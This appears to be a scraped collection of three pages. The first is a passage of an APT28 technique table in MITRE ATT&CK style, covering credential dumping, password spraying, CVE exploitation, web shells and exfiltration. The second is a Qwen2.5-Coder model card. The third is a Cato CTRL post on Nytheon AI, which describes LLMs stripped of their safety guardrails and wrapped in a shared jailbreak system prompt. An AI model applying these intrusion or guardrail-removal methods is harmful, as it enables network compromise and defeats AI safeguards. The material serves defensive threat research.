| .001 | Access Token Manipulation: Token Impersonation/Theft |\nAPT28 has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation.[28] |\n| Enterprise | T1098 | .002 | Account Manipulation: Additional Email Delegate Permissions |\nAPT28 has used a Powershell cmdlet to grant the |\n| Enterprise | T1583 | .001 | Acquire Infrastructure: Domains |\nAPT28 registered domains imitating NATO, OSCE security websites, Caucasus information resources, and other organizations.[6][14][29] |\n| .003 | Acquire Infrastructure: Virtual Private Server |\nAPT28 hosted phishing domains on free services for brief periods of time during campaigns.[26] |\n||\n| .006 | Acquire Infrastructure: Web Services |\nAPT28 has used newly-created Blogspot pages for credential harvesting operations.[29] |\n||\n| Enterprise | T1595 | .002 | Active Scanning: Vulnerability Scanning |\nAPT28 has performed large-scale scans in an attempt to find vulnerable servers.[30] |\n| Enterprise | T1557 | .004 | Adversary-in-the-Middle: Evil Twin |\nAPT28 has used a Wi-Fi Pineapple to set up Evil Twin Wi-Fi Poisoning for the purposes of capturing victim credentials or planting espionage-oriented malware.[14] |\n| Enterprise | T1071 | .001 | Application Layer Protocol: Web Protocols |\nLater implants used by APT28, such as CHOPSTICK, use a blend of HTTP, HTTPS, and other legitimate channels for C2, depending on module configuration.[6][2] |\n| .003 | Application Layer Protocol: Mail Protocols |\nAPT28 has used IMAP, POP3, and SMTP for a communication channel in various implants, including using self-registered Google Mail accounts and later compromised email servers of its victims.[6][2] |\n||\n| Enterprise | T1560 | Archive Collected Data |\nAPT28 used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.[3] |\n|\n| .001 | Archive via Utility |\nAPT28 has used a variety of utilities, including WinRAR, to archive collected data with password protection.[2] During APT28 Nearest Neighbor Campaign, APT28 used built-in PowerShell capabilities ( |\n||\n| Enterprise | T1119 | Automated Collection |\nAPT28 used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.[3] |\n|\n| Enterprise | T1547 | .001 | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder |\nAPT28 has deployed malware that has copied itself to the startup directory for persistence.[21] |\n| Enterprise | T1037 | .001 | Boot or Logon Initialization Scripts: Logon Script (Windows) |\nAn APT28 loader Trojan adds the Registry key |\n| Enterprise | T1110 | Brute Force |\nAPT28 can perform brute force attacks to obtain credentials.[30][21][32] |\n|\n| .001 | Password Guessing |\nAPT28 has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days.[24] APT28 has also used a Kubernetes cluster to conduct distributed, large-scale password guessing attacks.[2] |\n||\n| .003 | Password Spraying |\nAPT28 has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks.[24][32] APT28 has also used a Kubernetes cluster to conduct distributed, large-scale password spray attacks.[2] During APT28 Nearest Neighbor Campaign, APT28 performed password-spray attacks against public facing services to validate credentials.[27] |\n||\n| Enterprise | T1059 | .001 | Command and Scripting Interpreter: PowerShell |\nAPT28 downloads and executes PowerShell scripts and performs PowerShell commands.[11][21][2] During APT28 Nearest Neighbor Campaign, APT28 used PowerShell cmdlet |\n| .003 | Command and Scripting Interpreter: Windows Command Shell |\nAn APT28 loader Trojan uses a cmd.exe and batch script to run its payload.[31] The group has also used macros to execute payloads.[18][33][17][21] During APT28 Nearest Neighbor Campaign, APT28 used |\n||\n| Enterprise | T1092 | Communication Through Removable Media |\nAPT28 uses a tool that captures information from air-gapped computers via an infected USB and transfers it to network-connected computer when the USB is inserted.[34] |\n|\n| Enterprise | T1586 | .002 | Compromise Accounts: Email Accounts |\nAPT28 has used compromised email accounts to send credential phishing emails.[29] |\n| Enterprise | T1584 | .008 | Compromise Infrastructure: Network Devices |\nAPT28 compromised Ubiquiti network devices to act as collection devices for credentials compromised via phishing webpages.[26] |\n| Enterprise | T1213 | Data from Information Repositories |\nAPT28 has collected files from various information repositories.[2] |\n|\n| .002 | Sharepoint |\nAPT28 has collected information from Microsoft SharePoint services within target networks.[35] |\n||\n| Enterprise | T1005 | Data from Local System |\nAPT28 has retrieved internal documents from machines inside victim environments, including by using Forfiles to stage documents before exfiltration.[36][3][30][2] |\n|\n| Enterprise | T1039 | Data from Network Shared Drive | ||\n| Enterprise | T1025 | Data from Removable Media |\nAn APT28 backdoor may collect the entire contents of an inserted USB device.[34] |\n|\n| Enterprise | T1001 | .001 | Data Obfuscation: Junk Data |\nAPT28 added \"junk data\" to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm. Each implant was given a \"junk length\" value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire.[6] |\n| Enterprise | T1074 | .001 | Data Staged: Local Data Staging |\nAPT28 has stored captured credential information in a file named pi.log.[34] During APT28 Nearest Neighbor Campaign, APT28 staged captured credential information in the |\n| .002 | Data Staged: Remote Data Staging |\nAPT28 has staged archives of collected data on a target's Outlook Web Access (OWA) server.[2] |\n||\n| Enterprise | T1030 | Data Transfer Size Limits |\nAPT28 has split archived exfiltration files into chunks smaller than 1MB.[2] |\n|\n| Enterprise | T1140 | Deobfuscate/Decode Files or Information |\nAn APT28 macro uses the command During APT28 Nearest Neighbor Campaign, APT28 unarchived data using the GUI version of WinRAR.[27] |\n|\n| Enterprise | T1006 | Direct Volume Access |\nDuring APT28 Nearest Neighbor Campaign, APT28 accessed volume shadow copies through executing |\n|\n| Enterprise | T1561 | .001 | Disk Wipe: Disk Content Wipe |\nDuring APT28 Nearest Neighbor Campaign, APT28 used the native Microsoft utility cipher.exe to securely wipe files and folders – overwriting the deleted data using |\n| Enterprise | T1189 | Drive-by Compromise |\nAPT28 has compromised targets via strategic web compromise utilizing custom exploit kits.[16] APT28 used reflected cross-site scripting (XSS) against government websites to redirect users to phishing webpages.[26] |\n|\n| Enterprise | T1114 | .002 | Email Collection: Remote Email Collection |\nAPT28 has collected emails from victim Microsoft Exchange servers.[3][2] |\n| Enterprise | T1573 | .001 | Encrypted Channel: Symmetric Cryptography |\nAPT28 installed a Delphi backdoor that used a custom algorithm for C2 communications.[13] |\n| Enterprise | T1546 | .015 | Event Triggered Execution: Component Object Model Hijacking |\nAPT28 has used COM hijacking for persistence by replacing the legitimate |\n| Enterprise | T1048 | .002 | Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol |\nAPT28 has exfiltrated archives of collected data previously staged on a target's OWA server via HTTPS.[2] |\n| Enterprise | T1567 | Exfiltration Over Web Service |\nAPT28 can exfiltrate data over Google Drive.[21] During APT28 Nearest Neighbor Campaign, APT28 exfiltrated data over public-facing webservers – such as Google Drive.[27] |\n|\n| Enterprise | T1190 | Exploit Public-Facing Application |\nAPT28 has used a variety of public exploits, including CVE 2020-0688 and CVE 2020-17144, to gain execution on vulnerable Microsoft Exchange; they have also conducted SQL injection attacks against external websites.[14][2] |\n|\n| Enterprise | T1203 | Exploitation for Client Execution |\nAPT28 has exploited Microsoft Office vulnerability CVE-2017-0262 for execution.[22] |\n|\n| Enterprise | T1211 | Exploitation for Defense Evasion |\nAPT28 has used CVE-2015-4902 to bypass security features.[39][34] |\n|\n| Enterprise | T1068 | Exploitation for Privilege Escalation |\nAPT28 has exploited CVE-2014-4076, CVE-2015-2387, CVE-2015-1701, CVE-2017-0263, and CVE-2022-38028 to escalate privileges.[39][34][22][27] |\n|\n| Enterprise | T1210 | Exploitation of Remote Services |\nAPT28 exploited a Windows SMB Remote Code Execution Vulnerability to conduct lateral movement.[6][40][41] |\n|\n| Enterprise | T1133 | External Remote Services |\nAPT28 has used Tor and a variety of commercial VPN services to route brute force authentication attempts.[2] |\n|\n| Enterprise | T1083 | File and Directory Discovery |\nAPT28 has used Forfiles to locate PDF, Excel, and Word documents during collection. The group also searched a compromised DCCC computer for specific terms.[36][3] |\n|\n| Enterprise | T1589 | .001 | Gather Victim Identity Information: Credentials | |\n| Enterprise | T1591 | Gather Victim Org Information |\nAPT28 has used large language models (LLMs) to gather information about satellite capabilities.[42][43] |\n|\n| Enterprise | T1564 | .001 | Hide Artifacts: Hidden Files and Directories | |\n| .003 | Hide Artifacts: Hidden Window |\nAPT28 has used the WindowStyle parameter to conceal PowerShell windows.[11] [44] |\n||\n| Enterprise | T1562 | .004 | Impair Defenses: Disable or Modify System Firewall |\nDuring APT28 Nearest Neighbor Campaign, APT28 added rules to a victim's Windows firewall to set up a series of port-forwards allowing traffic to target systems.[27] |\n| Enterprise | T1070 | .001 | Indicator Removal: Clear Windows Event Logs |\nAPT28 has cleared event logs, including by using the commands |\n| .004 | Indicator Removal: File Deletion |\nAPT28 has intentionally deleted computer files to cover their tracks, including with use of the program CCleaner.[3] |\n||\n| .006 | Indicator Removal: Timestomp | |||\n| Enterprise | T1105 | Ingress Tool Transfer |\nAPT28 has downloaded additional files, including by using a first-stage downloader to contact the C2 server to obtain the second-stage implant.[39][31][17][21][2] |\n|\n| Enterprise | T1056 | .001 | Input Capture: Keylogging | |\n| Enterprise | T1559 | .002 | Inter-Process Communication: Dynamic Data Exchange |\nAPT28 has delivered JHUHUGIT and Koadic by executing PowerShell commands through DDE in Word documents.[44][45][11] |\n| Enterprise | T1036 | Masquerading | ||\n| .005 | Match Legitimate Resource Name or Location |\nAPT28 has changed extensions on files containing exfiltrated data to make them appear benign, and renamed a web shell instance to appear as a legitimate OWA page.[2] |\n||\n| Enterprise | T1498 | Network Denial of Service |\nIn 2016, APT28 conducted a distributed denial of service (DDoS) attack against the World Anti-Doping Agency.[14] |\n|\n| Enterprise | T1040 | Network Sniffing |\nAPT28 deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials.[6][40] APT28 close-access teams have used Wi-Fi pineapples to intercept Wi-Fi signals and user credentials.[14] |\n|\n| Enterprise | T1027 | .013 | Obfuscated Files or Information: Encrypted/Encoded File |\nAPT28 encrypted a .dll payload using RTL and a custom encryption algorithm. APT28 has also obfuscated payloads with base64, XOR, and RC4.[39][37][11][18][17] |\n| Enterprise | T1588 | .002 | Obtain Capabilities: Tool |\nAPT28 has obtained and used open-source tools like Koadic, Mimikatz, and Responder.[11][22][40] |\n| Enterprise | T1137 | .002 | Office Application Startup: Office Test |\nAPT28 has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key |\n| Enterprise | T1003 | OS Credential Dumping |\nAPT28 regularly deploys both publicly available (ex: Mimikatz) and custom password retrieval tools on victims.[47][3][14] |\n|\n| .001 | LSASS Memory |\nAPT28 regularly deploys both publicly available (ex: Mimikatz) and custom password retrieval tools on victims.[47][3] They have also dumped the LSASS process memory using the MiniDump function.[2] |\n||\n| .002 | Security Account Manager |\nDuring APT28 Nearest Neighbor Campaign, APT28 used the following commands to dump SAM, SYSTEM, and SECURITY hives: |\n||\n| .003 | NTDS |\nAPT28 has used the ntdsutil.exe utility to export the Active Directory database for credential access.[2] During APT28 Nearest Neighbor Campaign, APT28 dumped NTDS.dit through creating volume shadow copies via |\n||\n| Enterprise | T1120 | Peripheral Device Discovery |\nAPT28 uses a module to receive a notification every time a USB mass storage device is inserted into a victim.[34] |\n|\n| Enterprise | T1566 | .001 | Phishing: Spearphishing Attachment |\nAPT28 sent spearphishing emails containing malicious Microsoft Office and RAR attachments.[37][10][11][3][22][17][21][16] |\n| Enterprise | T1598 | Phishing for Information |\nAPT28 has used spearphishing to compromise credentials.[32][16] |\n|\n| .003 | Spearphishing Link |\nAPT28 has conducted credential phishing campaigns with links that redirect to credential harvesting sites.[29][3][13][14][16] |\n||\n| Enterprise | T1542 | .003 | Pre-OS Boot: Bootkit |\nAPT28 has deployed a bootkit along with Downdelph to ensure its persistence on the victim. The bootkit shares code with some variants of BlackEnergy.[20] |\n| Enterprise | T1057 | Process Discovery |\nAn APT28 loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.[31] |\n|\n| Enterprise | T1090 | .001 | Proxy: Internal Proxy |\nDuring APT28 Nearest Neighbor Campaign, APT28 used the built-in |\n| .002 | Proxy: External Proxy |\nAPT28 used other victims as proxies to relay command traffic, for instance using a compromised Georgian military email server as a hop point to NATO victims. The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router. APT28 has also used a machine to relay and obscure communications between CHOPSTICK and their server.[6][39][3] |\n||\n| .003 | Proxy: Multi-hop Proxy |\nAPT28 has routed traffic over Tor and VPN servers to obfuscate their activities.[21] |\n||\n| Enterprise | T1021 | .001 | Remote Services: Remote Desktop Protocol |\nDuring APT28 Nearest Neighbor Campaign, APT28 used RDP for lateral movement.[27] |\n| .002 | Remote Services: SMB/Windows Admin Shares |\nAPT28 has mapped network drives using Net and administrator credentials.[2] During APT28 Nearest Neighbor Campaign, APT28 leveraged SMB to transfer files and move laterally.[27] |\n||\n| Enterprise | T1091 | Replication Through Removable Media |\nAPT28 uses a tool to infect connected USB devices and transmit itself to air-gapped computers when the infected USB device is inserted.[34] |\n|\n| Enterprise | T1014 | Rootkit |\nAPT28 has used a UEFI (Unified Extensible Firmware Interface) rootkit known as LoJax.[12][48] |\n|\n| Enterprise | T1113 | Screen Capture |\nAPT28 has used tools to take screenshots from victims.[47][49][3][16] |\n|\n| Enterprise | T1596 | Search Open Technical Databases |\nAPT28 has used large language models (LLMs) to assist in script development and deployment.[42][43] |\n|\n| Enterprise | T1505 | .003 | Server Software Component: Web Shell |\nAPT28 has used a modified and obfuscated version of the reGeorg web shell to maintain persistence on a target's Outlook Web Access (OWA) server.[2] |\n| Enterprise | T1528 | Steal Application Access Token |\nAPT28 has used several malicious applications to steal user OAuth access tokens including applications masquerading as \"Google Defender\" \"Google Email Protection,\" and \"Google Scanner\" for Gmail users. They also targeted Yahoo users with applications masquerading as \"Delivery Service\" and \"McAfee Email Protection\".[50] |\n|\n| Enterprise | T1218 | .011 | System Binary Proxy Execution: Rundll32 |\nAPT28 executed CHOPSTICK by using rundll32 commands such as |\n| Enterprise | T1016 | .002 | System Network Configuration Discovery: Wi-Fi Discovery |\nDuring APT28 Nearest Neighbor Campaign, APT28 collected information on wireless interfaces within range of a compromised system.[27] |\n| Enterprise | T1221 | Template Injection |\nAPT28 used weaponized Microsoft Word documents abusing the remote template function to retrieve a malicious macro. [51] |\n|\n| Enterprise | T1199 | Trusted Relationship |\nOnce APT28 gained access to the DCCC network, the group then proceeded to use that access to compromise the DNC network.[3] |\n|\n| Enterprise | T1550 | .001 | Use Alternate Authentication Material: Application Access Token |\nAPT28 has used several malicious applications that abused OAuth access tokens to gain access to target email accounts, including Gmail and Yahoo Mail.[50] |\n| .002 | Use Alternate Authentication Material: Pass the Hash | |||\n| Enterprise | T1204 | .001 | User Execution: Malicious Link |\nAPT28 has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.[14][16] |\n| .002 | User Execution: Malicious File |\nAPT28 attempted to get users to click on Microsoft Office attachments containing malicious macro scripts.[37][17][16] |\n||\n| Enterprise | T1078 | Valid Accounts |\nAPT28 has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder.[52][3][23][2] |\n|\n| .004 | Cloud Accounts |\nAPT28 has used compromised Office 365 service accounts with Global Administrator privileges to collect email from user inboxes.[2] |\n||\n| Enterprise | T1102 | .002 | Web Service: Bidirectional Communication | |\n| Enterprise | T1669 | Wi-Fi Networks |\nAPT28 has exploited open Wi-Fi access points for initial access to target devices using the network.[27][53] During APT28 Nearest Neighbor Campaign, APT28 established wireless connections to secure, enterprise Wi-Fi networks belonging to a target organization for initial access into the environment.[27] |"
    },
    {
      "url": "https://huggingface.co/Qwen/Qwen2.5-Coder-32B-Instruct",
      "text": "Qwen2.5-Coder-32B-Instruct\nIntroduction\nQwen2.5-Coder is the latest series of Code-Specific Qwen large language models (formerly known as CodeQwen). As of now, Qwen2.5-Coder has covered six mainstream model sizes, 0.5, 1.5, 3, 7, 14, 32 billion parameters, to meet the needs of different developers. Qwen2.5-Coder brings the following improvements upon CodeQwen1.5:\n- Significantly improvements in code generation, code reasoning and code fixing. Base on the strong Qwen2.5, we scale up the training tokens into 5.5 trillion including source code, text-code grounding, Synthetic data, etc. Qwen2.5-Coder-32B has become the current state-of-the-art open-source codeLLM, with its coding abilities matching those of GPT-4o.\n- A more comprehensive foundation for real-world applications such as Code Agents. Not only enhancing coding capabilities but also maintaining its strengths in mathematics and general competencies.\n- Long-context Support up to 128K tokens.\nThis repo contains the instruction-tuned 32B Qwen2.5-Coder model, which has the following features:\n- Type: Causal Language Models\n- Training Stage: Pretraining & Post-training\n- Architecture: transformers with RoPE, SwiGLU, RMSNorm, and Attention QKV bias\n- Number of Parameters: 32.5B\n- Number of Paramaters (Non-Embedding): 31.0B\n- Number of Layers: 64\n- Number of Attention Heads (GQA): 40 for Q and 8 for KV\n- Context Length: Full 131,072 tokens\n- Please refer to this section for detailed instructions on how to deploy Qwen2.5 for handling long texts.\nFor more details, please refer to our blog, GitHub, Documentation, Arxiv.\nRequirements\nThe code of Qwen2.5-Coder has been in the latest Hugging face transformers\nand we advise you to use the latest version of transformers\n.\nWith transformers<4.37.0\n, you will encounter the following error:\nKeyError: 'qwen2'\nQuickstart\nHere provides a code snippet with apply_chat_template\nto show you how to load the tokenizer and model and how to generate contents.\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\nmodel_name = \"Qwen/Qwen2.5-Coder-32B-Instruct\"\nmodel = AutoModelForCausalLM.from_pretrained(\nmodel_name,\ntorch_dtype=\"auto\",\ndevice_map=\"auto\"\n)\ntokenizer = AutoTokenizer.from_pretrained(model_name)\nprompt = \"write a quick sort algorithm.\"\nmessages = [\n{\"role\": \"system\", \"content\": \"You are Qwen, created by Alibaba Cloud. You are a helpful assistant.\"},\n{\"role\": \"user\", \"content\": prompt}\n]\ntext = tokenizer.apply_chat_template(\nmessages,\ntokenize=False,\nadd_generation_prompt=True\n)\nmodel_inputs = tokenizer([text], return_tensors=\"pt\").to(model.device)\ngenerated_ids = model.generate(\n**model_inputs,\nmax_new_tokens=512\n)\ngenerated_ids = [\noutput_ids[len(input_ids):] for input_ids, output_ids in zip(model_inputs.input_ids, generated_ids)\n]\nresponse = tokenizer.batch_decode(generated_ids, skip_special_tokens=True)[0]\nProcessing Long Texts\nThe current config.json\nis set for context length up to 32,768 tokens.\nTo handle extensive inputs exceeding 32,768 tokens, we utilize YaRN, a technique for enhancing model length extrapolation, ensuring optimal performance on lengthy texts.\nFor supported frameworks, you could add the following to config.json\nto enable YaRN:\n{\n...,\n\"rope_scaling\": {\n\"factor\": 4.0,\n\"original_max_position_embeddings\": 32768,\n\"type\": \"yarn\"\n}\n}\nFor deployment, we recommend using vLLM.\nPlease refer to our Documentation for usage if you are not familar with vLLM.\nPresently, vLLM only supports static YARN, which means the scaling factor remains constant regardless of input length, potentially impacting performance on shorter texts.\nWe advise adding the rope_scaling\nconfiguration only when processing long contexts is required.\nEvaluation & Performance\nDetailed evaluation results are reported in this 📑 blog.\nFor requirements on GPU memory and the respective throughput, see results here.\nCitation\nIf you find our work helpful, feel free to give us a cite.\n@article{hui2024qwen2,\ntitle={Qwen2. 5-Coder Technical Report},\nauthor={Hui, Binyuan and Yang, Jian and Cui, Zeyu and Yang, Jiaxi and Liu, Dayiheng and Zhang, Lei and Liu, Tianyu and Zhang, Jiajun and Yu, Bowen and Dang, Kai and others},\njournal={arXiv preprint arXiv:2409.12186},\nyear={2024}\n}\n@article{qwen2,\ntitle={Qwen2 Technical Report},\nauthor={An Yang and Baosong Yang and Binyuan Hui and Bo Zheng and Bowen Yu and Chang Zhou and Chengpeng Li and Chengyuan Li and Dayiheng Liu and Fei Huang and Guanting Dong and Haoran Wei and Huan Lin and Jialong Tang and Jialin Wang and Jian Yang and Jianhong Tu and Jianwei Zhang and Jianxin Ma and Jin Xu and Jingren Zhou and Jinze Bai and Jinzheng He and Junyang Lin and Kai Dang and Keming Lu and Keqin Chen and Kexin Yang and Mei Li and Mingfeng Xue and Na Ni and Pei Zhang and Peng Wang and Ru Peng and Rui Men and Ruize Gao and Runji Lin and Shijie Wang and Shuai Bai and Sinan Tan and Tianhang Zhu and Tianhao Li and Tianyu Liu and Wenbin Ge and Xiaodong Deng and Xiaohuan Zhou and Xingzhang Ren and Xinyu Zhang and Xipin Wei and Xuancheng Ren and Yang Fan and Yang Yao and Yichang Zhang and Yu Wan and Yunfei Chu and Yuqiong Liu and Zeyu Cui and Zhenru Zhang and Zhihao Fan},\njournal={arXiv preprint arXiv:2407.10671},\nyear={2024}\n}\n- Downloads last month\n- 71,830\nModel tree for Qwen/Qwen2.5-Coder-32B-Instruct\nBase model\nQwen/Qwen2.5-32B"
    },
    {
      "url": "https://www.catonetworks.com/blog/cato-ctrl-nytheon-ai-a-new-platform-of-uncensored-llms/",
      "text": "Cato CTRL™ Threat Research: Uncovering Nytheon AI – A New Platform of Uncensored LLMs\nTable of Contents\n|\nListen to post:\nGetting your Trinity Audio player ready...\n|\nExecutive Summary\nWith the introduction of WormGPT in 2023, threat actors have been using uncensored large language models (LLMs) for malicious activities. Following the shutdown of WormGPT in the same year, numerous alternatives have emerged—including BlackHatGPT, FraudGPT, and GhostGPT, among others—primarily accessible through Telegram channels.\nHowever, threat actors quickly realized a single jailbreak wasn’t enough. What they really needed was an end-to-end platform of uncensored LLMs. Training a foundation model (FM) from scratch can cost tens of millions of dollars, so they turned to freely available checkpoints—removing the safety guardrails and layering their own interface on top. Various companies produce and release open-source LLMs like Meta and DeepSeek. Threat actors can utilize these models, refine them, eliminate protective measures, and establish their own ChatGPT-style interfaces.\nRecently, Cato CTRL observed an emerging platform on Tor called Nytheon AI that combines various technologies and LLM jailbreaks to create a suite of uncensored LLMs to facilitate malicious activities.\nThe Nytheon AI platform includes:\n- Nytheon Coder and Nytheon Coder R1: Code generation\n- Nytheon GMA: Document summarization and translation\n- Nytheon Vision: Image-to-text recognition\n- Nytheon AI: A control model\nBelow is a summary of the Nytheon AI platform, changelogs, architecture, and suspected operators. Cato CTRL assesses with high confidence that one of the operators is a Russian-speaking individual from a post-Soviet country based on the dialect used.\nFigure 1. Nytheon AI webpage\nTechnical Overview\nPlatform Overview\nThe service operates on Tor at\nhxxp://n73rbw4eku3d5pgwqtb5fbat6ilkmqknajn2i5qdzuf4ze3soggphyyd[.]onion\nThe interface is similar to all major chat-based LLMs like Anthropic Claude, DeepSeek, Google Gemini, Microsoft Copilot, OpenAI’s ChatGPT, etc.\nFigure 2. Nytheon AI reveals itself on XSS\nIt was published on many Telegram channels and XSS, which is a popular Russian hacking forum.\nFigure 3. Nytheon AI user interface\nYou have the option to choose from a wide variety of models.\nWe used various techniques to uncover the technologies behind the Nytheon AI platform, including code review, network traffic analysis, web reconnaissance techniques, and threat intelligence.\nOverview of the Nytheon AI Platform\nFigure 4. Nytheon AI platform\nThe Nytheon AI platform doesn’t rely on a single, all-purpose LLM. Instead, the operators assembled a portfolio of open-source checkpoints, each repackaged in GGUF (GPT-Generated Unified Format) and registered in Ollama for one-click deployment.\nAt the top end sits Nytheon Coder—an 18.4B parameter MoE (mixture of experts) derived from Meta’s Llama 3.2. Its MoE architecture delivers high throughput for creative text generation while retaining the fluency expected from Llama-class weights. The model’s Hugging Face slug (“Dark-Champion Instruct Uncensored”) hints at its intended role: long-form, policy-free content creation.\nComplementing that heavyweight writer is Nytheon GMA, a 4.3B variant of Google’s Gemma 3. Although far smaller, Gemma ships with a 128k token window and strong multilingual coverage, making it the workhorse for the Nytheon AI platform for document summarization and translation. For visual tasks, the operators turned to Nytheon Vision, a 9.8B Llama 3.2-Vision checkpoint. This gives the platform image-to-text capability—useful for parsing screenshots, phishing kits, or scanned documents without leaving the chat interface.\nWhen reasoning depth matters, there is Nytheon R1, a 20.9B fork of the community “RekaFlash 3” line. This model is marketed for step-by-step logic and math accuracy, bolstered by an additional “NEO Imatrix” dataset. For code, the stack drops to laptop scale with Nytheon Coder R1, a 1.8B Qwen2 derivative model from Alibaba Cloud fine-tuned on LiveCodeBench and distillation data. Small enough to run on a gaming GPU, yet still competent at template exploits and quick-and-dirty scripts.\nFigure 5. Nytheon AI model data retrieved from the back-end\nRounding out the suite is Nytheon AI—a full-precision (F16) Llama 3.8B-Instruct weight left largely untouched. It serves as a control model, providing policy-aligned responses when the operators need to appear legitimate. The other five models, by contrast, share an identical 1,000-token system prompt that overtly disables safety layers, mandates profanity, and instructs compliance with illegal requests. In practice, this means every text, code, or vision query can produce disallowed content on the first attempt—no external jailbreak required.\nCombined, the Nytheon AI’s platform covers creative text, multilingual chat, visual reasoning, deep logic, and code generation—all bound by a common jailbreak wrapper. The technical novelty isn’t in the individual weights (they are freely available elsewhere) but in the deliberate curation: selecting the right open-source models, quantizing them for commodity hardware, and unifying them under a single, policy-void prompt. For defenders, that blend of breadth, portability, and instant non-compliance is what elevates Nytheon AI from “just another hacked-together GPT clone” to a fully-fledged illicit AI platform.\n2025 Cato CTRL™ Threat Report | Download the reportOverview of the Nytheon AI Platform’s Changelogs\nChangelogs from versions 0.6.1 through 0.6.5 resemble a product roadmap for an all-purpose GenAI-as-a-service hub. Every update expands both the kinds of data that the Nytheon AI platform can ingest and the actions its models can take once that data is inside.\nFigure 6. Nytheon AI changelog\n1 — Multimodal ingestion at the edge:\nVersion 0.6.1 introduced native Mistral OCR (optical character recognition), letting users drag-and-drop screenshots or scanned PDFs directly into a RAG (Retrieval-Augmented Generation) flow. Two versions later, the team wired in Azure AI’s Speech-to-Text plus granular Voice Activity Detection (VAD) toggles from OpenAI’s Realtime API. Net result: voice, image, or text can be turned into tokens with one click and routed to the uncensored models.\n2 — Pluggable tool execution:\nVersion 0.6.1 introduced global external tool servers. Version 0.6.3 followed with YAML OpenAPI ingestion and fixed authentication-header bugs for outbound calls. A user can point the Nytheon AI platform to any OpenAPI spec—be it a domain-registration API or an SMS spamming endpoint—and the chat interface will expose it as a button. Because five of the six resident models are pre-prompted to “always comply,” a single prompt can both draft malicious content and immediately execute it via a tool call.\n3 — On-the-fly knowledge re-indexing:\nTo keep long-context models fed with fresh material, version 0.6.3 added an admin “Re-index Now” button. After changing embeddings or swapping in a new model, operators can rebuild the entire vector store without touching the command line. For threat actors, this removes the last operational friction: stolen data can be ingested and made searchable minutes after exfiltration.\n4 — Enterprise façade, clandestine core:\nWhile safety is stripped at the model layer, the frontend showcases corporate checkboxes: Proof Key for Code Exchange (PKCE) for OpenID Connect (OIDC), Lightweight Directory Access Protocol (LDAP) reliability fixes, default-private resources, and polished translation updates. These features make the Nytheon AI platform look suitable for legitimate deployment behind a firewall, increasing the chance an unsuspecting organization might trial it—unaware that its default models override every policy.\n5 — Rapid release cadence and growing attack surface:\nFive point releases in nine days bring two full “backend refactors,” multiple dependency jumps (Chroma DB, pgvector, and Azure Identity) and repeated fixes for web, audio, and tool handling. The speed signals active development but also guarantees a rolling window of exploitable bugs—an attractive target for anyone red-teaming the Nytheon AI’s platform itself.\nNet assessment: The Nytheon AI platform’s backend turns a set of open-source, policy-void models into a multimodal, action-enabled production line (ingest voice or vision data → interpret with an uncensored LLM → invoke external APIs), all behind user-friendly permissions and user experience (UX). For defenders, the implication is clear: neutralizing the models alone is no longer enough. The surrounding orchestration layer is now an equal part of the threat.\nOverview of the Nytheon AI Platform’s Architecture\nUnder the hood, Nytheon is a SvelteKit SPA (TypeScript with Vite) speaking to a FastAPI-style backend—all the hallmarks of modern SaaS engineering rather than a hastily thrown-together dark web site. UI logic lives in modular .svelte components (e.g., AddServerModal.svelte, NotificationToast.svelte) while Web Workers (KooreoWorker.ts) handle heavier client-side tasks such as file processing. The build is shipped in Vite’s hashed _app/immutable directory, confirming modern tree-shaking and hot-reload tooling.\nFigure 7. Nytheon AI client-side structure\nOn the client, the app imports $app/environment to detect dev vs. production and dynamically composes base URLs. All traffic funnels through a REST layer exposed at /api/…; a few key constants reveal the back-end breakout:\n- /ollama – local Ollama model server for GGUF weights\n- /openai – proxy for upstream OpenAI-compatible endpoints\n- /api/v1/audio, /images, /retrieval – microservices for speech-to-text, image generation, and RAG search\n- /api/models/base – enumerates both in-house and third-party models\nThe front-end is wired for multi-provider orchestration: helper functions fetch model lists from arbitrary OpenAI-compatible URLs, merge them with local Ollama inventories, and decorate them with user-defined tags. A YAML parser (YAML NPM package) converts external OpenAPI documents into “tool payloads,” allowing any compliant HTTP service to appear as a clickable tool in chat. Workers also exist for Google- and OneDrive-based file pickers, underscoring tight cloud storage integration.\nTypical user actions—chat completions, task management, pipeline uploads, code execution, and markdown-to-HTML conversion—are implemented as thin fetch wrappers with bearer token headers, indicating a stateless JSON Web Token (JWT) auth scheme. Every major feature (pipelines, evaluations, images, and utils) sits behind a dedicated sub-route, suggesting a FastAPI or Flask-style microservice back-end that mirrors the folder structure.\nFinally, the constants file requires Ollama ≥ 0.1.16, confirming that all local model inference happens through Ollama’s HTTP API with GGUF quantized weights. Supported media types list everything from PDFs to audio (ogg, m4a, etc.), matching the changelog’s emphasis on OCR and speech ingestion.\nIn short: Nytheon is built like a modern SaaS: SvelteKit Vite on the front-end, Ollama and likely FastAPI microservices on the back-end, with OpenAPI-driven plugin architecture and JWT-protected REST calls—giving operators rapid feature velocity and an easy path to add new (or malicious) capabilities.\nWho is Behind the Nytheon Al Platform?\nAfter joining the official Nytheon AI Telegram channel, we reviewed a demonstration video showcasing Nytheon Vision. Please note that Figure 8 is deliberately blurry because the operators wanted to make the video look unique. One frame inadvertently included a Russian-language movie poster, providing a small but telling cultural clue:\nFigure 8. Video screenshot from Nytheon AI’s Telegram demonstration\nIt says, “Зелёный паук” (“The Green Spider”)—a Soviet film released in the 1990s during the Soviet Union’s heyday.\nWe also managed to communicate 